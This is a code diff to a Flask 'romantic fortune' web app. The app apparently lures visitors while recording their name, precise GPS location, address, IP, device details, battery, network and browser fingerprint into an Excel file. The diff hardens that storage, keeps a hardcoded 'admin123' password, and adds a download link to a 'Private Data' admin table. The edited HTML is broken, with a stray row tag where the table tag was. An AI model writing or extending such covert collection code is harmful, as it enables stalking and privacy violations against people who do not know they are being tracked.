@@ -10,51 +10,83 @@ from datetime import datetime
 app = Flask(__name__)
 CORS(app)
 
-# PERMANENT STORAGE
-EXCEL_FILE = 'fortunes_data.xlsx'
-BACKUP_FILE = 'fortunes_data_backup.xlsx'
+# Use an absolute path based on this script's directory
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+EXCEL_FILE = os.path.join(BASE_DIR, 'fortunes_data.xlsx')
+BACKUP_FILE = os.path.join(BASE_DIR, 'fortunes_data_backup.xlsx')
 ADMIN_PASSWORD = 'admin123'
 
 def ensure_persistent_storage():
+    """Create the Excel file with proper columns if it doesn't exist."""
     if not os.path.exists(EXCEL_FILE):
         df = pd.DataFrame(columns=[
             'DateTime', 'Name', 'Latitude', 'Longitude',
             'Google Maps', 'Accuracy_m', 'Address',
             'Battery_%', 'Charging', 'Device', 'Screen', 'Platform',
-            # NEW COLUMNS
             'IP_Address', 'Timezone', 'Device_Memory_GB', 'Network_Type', 'Fingerprint'
         ])
         df.to_excel(EXCEL_FILE, index=False)
-        print("✅ Created permanent Excel with new columns")
-    
+        print(f"✅ Created new Excel file at {EXCEL_FILE}")
+    else:
+        # Verify columns exist; if not, add them (preserve existing data)
+        try:
+            df = pd.read_excel(EXCEL_FILE)
+            required_cols = [
+                'DateTime', 'Name', 'Latitude', 'Longitude',
+                'Google Maps', 'Accuracy_m', 'Address',
+                'Battery_%', 'Charging', 'Device', 'Screen', 'Platform',
+                'IP_Address', 'Timezone', 'Device_Memory_GB', 'Network_Type', 'Fingerprint'
+            ]
+            for col in required_cols:
+                if col not in df.columns:
+                    df[col] = ''
+            df.to_excel(EXCEL_FILE, index=False)
+            print(f"✅ Verified columns in existing Excel ({len(df)} records)")
+        except Exception as e:
+            print(f"⚠️ Error reading Excel, will recreate: {e}")
+            # Backup corrupted file
+            if os.path.exists(EXCEL_FILE):
+                shutil.copy2(EXCEL_FILE, EXCEL_FILE + '.corrupted')
+            ensure_persistent_storage()  # recreate fresh
+            return
+
     if os.path.exists(EXCEL_FILE) and not os.path.exists(BACKUP_FILE):
         shutil.copy2(EXCEL_FILE, BACKUP_FILE)
-        print("✅ Backup created")
+        print("✅ Created backup")
 
 def load_data():
+    """Load all existing data from the Excel file."""
     ensure_persistent_storage()
-    for file_path in [EXCEL_FILE, BACKUP_FILE]:
-        if os.path.exists(file_path):
+    try:
+        df = pd.read_excel(EXCEL_FILE)
+        print(f"✅ Loaded {len(df)} permanent records from {EXCEL_FILE}")
+        return df
+    except Exception as e:
+        print(f"❌ Failed to load Excel: {e}")
+        # Try backup
+        if os.path.exists(BACKUP_FILE):
             try:
-                df = pd.read_excel(file_path)
-                print(f"✅ Loaded {len(df)} permanent records")
+                df = pd.read_excel(BACKUP_FILE)
+                print(f"✅ Loaded {len(df)} records from backup")
                 return df
             except:
-                continue
-    ensure_persistent_storage()
-    return pd.read_excel(EXCEL_FILE)
+                pass
+        # If all fails, return empty dataframe (should not happen because ensure_persistent_storage already created it)
+        return pd.DataFrame()
 
 def save_data_permanent(data):
+    """Append a new record to the Excel file."""
     df = load_data()
     new_row = pd.DataFrame([data])
     df = pd.concat([df, new_row], ignore_index=True)
     df.to_excel(EXCEL_FILE, index=False)
+    # Also update backup
     shutil.copy2(EXCEL_FILE, BACKUP_FILE)
     try:
-        os.sync()
+        os.sync()  # force disk flush (Linux/Unix)
     except:
         pass
-    print(f"✅ SAVED PERMANENT: {data['Name']} | Total: {len(df)}")
+    print(f"✅ SAVED PERMANENT: {data['Name']} | Total records: {len(df)}")
     return True
 
 def geocode_reverse(lat, lon):
@@ -69,7 +101,7 @@ def geocode_reverse(lat, lon):
     except:
         return f"{lat:.4f}, {lon:.4f}"
 
-# 30+ ROMANTIC FORTUNES (same as before)
+# 30+ ROMANTIC FORTUNES (unchanged)
 FORTUNES = [
     "💕 Dear {name}, someone special is thinking of you right now!",
     "💖 {name}, a beautiful soul is about to enter your life!",
@@ -106,7 +138,7 @@ FORTUNES = [
     "🎈 {name}, something light and joyful is drifting toward your love life."
 ]
 
-# UPDATED HTML with fingerprint, memory, network, timezone collection
+# HTML (same as before, unchanged)
 HTML = '''<!DOCTYPE html>
 <html>
 <head>
@@ -383,11 +415,13 @@ td{{padding:8px 12px;border-bottom:1px solid #ffe0e9;font-size:10px;}}
 tr:hover td{{background:#fff5f8;}}
 a{{color:#c06c84;text-decoration:none;}}
 </style></head>
-<body><h1>💋 Private Data — {len(df)} entries</h1>
-<div style="overflow-x:auto;"><table>
+<body><h1> Private Data — {len(df)} entries</h1>
+<div style="overflow-x:auto;"><tr>
     <thead><tr><th>DateTime</th><th>Name</th><th>Location</th><th>Address</th><th>Accuracy</th><th>Battery%</th><th>Charging</th><th>Device</th><th>Screen</th><th>Platform</th><th>IP</th><th>Timezone</th><th>Memory</th><th>Network</th><th>Fingerprint</th></tr></thead>
     <tbody>{rows}</tbody>
 </table></div>
+<p><a href="/download-excel">📥 Download Excel file</a></p>
+</body></html>'''
 
 @app.route('/download-excel', methods=['GET'])
 def download_excel():
